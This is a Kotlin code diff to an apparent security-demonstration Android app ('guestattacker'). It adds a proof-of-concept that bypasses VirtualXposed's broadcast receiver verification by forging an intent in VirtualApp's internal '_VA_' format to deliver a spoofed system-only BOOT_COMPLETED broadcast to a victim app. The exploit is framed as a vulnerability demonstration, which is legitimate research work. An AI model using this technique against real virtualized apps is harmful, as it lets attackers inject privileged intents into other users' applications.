@@ -2,6 +2,7 @@ package com.virtualxposed.guestattacker
 
 import android.annotation.SuppressLint
 import android.app.ActivityManager
+import android.content.Intent
 import android.os.Bundle
 import androidx.activity.ComponentActivity
 import androidx.activity.compose.setContent
@@ -174,6 +175,23 @@ class MainActivity : ComponentActivity() {
                             DemoCategory.IPC
                         ) {
                             IPC.messageVictimApp(this)
+                        }, DemoAction(
+                            "Bypass receiver verification",
+                            "VirtualXposed registers all receivers as exported static broadcast receivers, with no caller verification. " +
+                                    "To prevent malicious broadcasts rewrites intents and redirects them to the real receiver. " +
+                                    "However, by manually calling the real receiver it is possible to send arbitrary Intents, including system-exclusive intents such as BOOT_COMPLETED",
+                            DemoCategory.IPC
+                        ) {
+                            val intent = Intent().apply {
+                                // Comes from how VirtualApp registers receivers:
+                                // componentAction = String.format("_VA_%s_%s", info.packageName, info.name);
+                                setAction("_VA_${VICTIM_APP}_$VICTIM_APP.BootReceiver")
+                                putExtra("_VA_|_intent_", Intent().apply {
+                                    setAction("android.intent.action.BOOT_COMPLETED")
+                                })
+                                putExtra("_VA_|_user_id_", 0)
+                            }
+                            this.sendBroadcast(intent)
                         }
                     )
                 )
